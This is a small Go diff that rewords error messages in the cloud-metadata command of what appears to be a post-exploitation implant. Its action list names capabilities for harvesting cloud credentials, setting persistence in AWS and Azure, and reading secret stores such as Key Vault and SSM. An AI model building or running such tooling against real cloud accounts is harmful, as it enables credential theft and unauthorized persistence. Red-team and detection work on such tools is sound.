@@ -55,7 +55,7 @@ func (c *CloudMetadataCommand) Execute(task structs.Task) structs.CommandResult 
 	args := cloudMetadataArgs{Action: "detect", Provider: "auto", Timeout: defaultCloudTimeout}
 	if task.Params != "" {
 		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return errorf("Error parsing parameters: %v", err)
+			return errorf("parsing parameters: %v", err)
 		}
 	}
 	if args.Action == "" {
@@ -104,7 +104,7 @@ func (c *CloudMetadataCommand) Execute(task structs.Task) structs.CommandResult 
 	case "gcp-gcs", "gcp-storage":
 		return successResult(gcpListBuckets(timeout))
 	default:
-		return errorResult("Error: unknown action. Available: detect, all, creds, identity, userdata, network, storage, aws-iam, azure-graph, gcp-iam, aws-persist, azure-persist, aws-ssm, azure-keyvault, gcp-secrets, aws-s3, azure-blob, gcp-gcs")
+		return errorResult("unknown action. Available: detect, all, creds, identity, userdata, network, storage, aws-iam, azure-graph, gcp-iam, aws-persist, azure-persist, aws-ssm, azure-keyvault, gcp-secrets, aws-s3, azure-blob, gcp-gcs")
 	}
 }
 
